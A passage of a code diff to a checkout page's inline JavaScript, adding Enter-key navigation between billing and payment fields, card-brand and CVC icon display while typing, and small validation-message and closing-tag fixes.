+  const enterSequences = {
+    billing: ['name', 'address', 'address2', 'city', 'state', 'postal'],
+    payment: ['card', 'expiry', 'cvc']
+  };
+
+  function getCurrentEnterSequence() {
+    return currentStep === 1 ? enterSequences.billing : enterSequences.payment;
+  }
+
+  Object.values(enterSequences).flat().forEach(id => {
+    const input = document.getElementById(id);
+    if (!input) return;
+
+    input.addEventListener('keydown', e => {
+      if (e.key !== 'Enter' || e.isComposing) return;
+
+      e.preventDefault();
+
+      const sequence = getCurrentEnterSequence();
+      const index = sequence.indexOf(id);
+      if (index === -1) return;
+
+      // Find the next available field in the current step.
+      for (let i = index + 1; i < sequence.length; i++) {
+        const next = document.getElementById(sequence[i]);
+        const field = next?.closest('.field');
+
+        if (
+          next &&
+          !next.disabled &&
+          !field?.classList.contains('hidden') &&
+          !field?.closest('.hidden')
+        ) {
+          next.focus();
+          return;
+        }
+      }
+
+      // Last field: activate Continue on billing or Save on payment.
+      const actionButton = currentStep === 1 ? continueButton : saveButton;
+
+      if (actionButton && !actionButton.disabled && !busy) {
+        actionButton.click();
+      }
+    });
+  });
+
   // Billing field UX.
   billingFields.forEach(([id, validator, message]) => {
     const input = document.getElementById(id);
@@ -1680,7 +2908,7 @@ document.addEventListener('DOMContentLoaded', () => {
     input.addEventListener('blur', () => {
       input.closest('.field')?.classList.add('touched');
       if (!validator(input.value.trim())) {
-        setFieldState(input, 'error', message);
+        setFieldState(input, 'error', message());
       } else {
         setFieldState(input, 'valid', '');
       }
@@ -1692,7 +2920,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (validator(input.value.trim())) {
           setFieldState(input, 'valid', '');
         } else {
-          setFieldState(input, 'error', message);
+          setFieldState(input, 'error', message());
         }
       }
       validateBilling();
@@ -1736,7 +2964,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const digits = digitsOnly(cardInput.value).slice(0, 19);
     cardInput.value = digits.replace(/(.{4})/g, '$1 ').trim();
 
-    if (cardInput.closest('.field')?.classList.contains('touched')) validateCard();
+    // While typing, show the detected card brand rather than the error icon.
+    if (!cardInput.closest('.field')?.classList.contains('touched')) {
+      renderCardIcon('brand', digits);
+    } else {
+      validateCard();
+    }
     updateSaveButton();
   });
 
@@ -1800,6 +3033,7 @@ document.addEventListener('DOMContentLoaded', () => {
   cvcInput.addEventListener('input', () => {
     cvcInput.value = digitsOnly(cvcInput.value).slice(0, 4);
     if (cvcInput.closest('.field')?.classList.contains('touched')) validateCvc();
+    else renderCvcIcon('default');
     updateSaveButton();
   });
 
@@ -1862,11 +3096,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 3200);
   });
 
+  renderCardIcon('brand', '');
+  renderCvcIcon('default');
+
   // Initial page load: ONE loader, then Billing. Header is untouched.
   showLoader();
   window.setTimeout(() => showStep(1), 1800);
 });
 </script>
-
-
-</body></html>
+</body>
+</html>
